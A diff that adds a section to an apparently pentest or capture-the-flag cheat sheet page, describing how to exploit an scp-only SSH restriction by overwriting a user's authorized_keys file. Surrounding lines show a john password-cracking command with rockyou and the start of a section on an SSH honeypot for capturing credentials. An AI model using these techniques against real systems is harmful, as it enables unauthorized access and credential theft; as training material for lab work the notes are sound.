@@ -52,6 +52,28 @@
                     <pre><code class="language-bash">john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>  
                 </ul>
 
+            <h2>SSH login restricted</h2>
+                <ul>
+                    <p>This is a very picky situation. Supose that when you attempt to login into a box through SSH you recive the following error</p>
+                    <pre><code class="language-bash">PTY allocation request failed on channel 0
+ACCESS DENIED.
+usage: scp [-346BCpqrv] [-c cipher] [-F ssh_config] [-i identity_file]
+           [-l limit] [-o ssh_option] [-P port] [-S program] source ... target</code></pre>
+                    <p>This means that SSH connection is not allowed but you can still use scp to transfer files. In that case you may try to replace the .ssh/authorized_keys file from any user</p>
+                    <pre><code class="language-bash">scp authorized_keys max@192.168.1.100:/home/max/.ssh/authorized_keys</code></pre>    
+                    <p>In case you found an script like the following confirms that you wont be able to login via SSH but you can still use scp</p>
+                    <pre><code class="language-bash">#!/bin/bash
+case $SSH_ORIGINAL_COMMAND in
+ 'scp'*)
+    $SSH_ORIGINAL_COMMAND
+    ;;
+ *)
+    echo "ACCESS DENIED."
+    scp
+    ;;
+esac</code></pre>     
+                </ul>
+
             <h2>SSH honeypot to capture credentials</h2>
             <ul>
                 <p>In case you found that there is a victim machine or other who is attempting to stablish an SSH connection to your attacker machine we could be able to create a fake SSH server (honey pot) in order to capture it's credentials. To do so use</p>
